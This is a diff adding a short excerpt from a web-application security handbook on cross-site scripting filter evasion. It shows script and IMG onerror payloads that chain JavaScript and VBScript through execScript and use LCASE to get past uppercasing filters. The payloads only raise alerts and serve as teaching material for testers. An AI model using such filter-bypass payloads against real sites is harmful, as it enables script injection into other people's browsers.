@@ -1,0 +1,12 @@
+Combining VBScript and JavaScript To add further layers of complexity to your attack, and circumvent some filters, 
+you can call into VBScript from JavaScript, and vice versa:
+<script>execScript("MsgBox 1","vbscript");</script>
+<script language=vbs>execScript("alert(1)")</script>
+ You can even nest these calls and ping-pong between the languages as required: 
+ <script>execScript('execScript "alert(1)","javascript"',"vbscript");</script>
+ As mentioned, VBScript is case-insensitive, allowing you to execute code in contexts where your input is converted to
+ uppercase. If you really want to call JavaScript functions in these situations, you can use string manipulation 
+ functions within VBScript to construct a command with the required case and then execute this using JavaScript:
+ <SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE("ALERT(1)")) </SCRIPT>
+<IMG ONERROR="VBS:EXECSCRIPT LCASE('ALERT(1)')" SRC=A>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12525-12536). Wiley. Kindle Edition. 
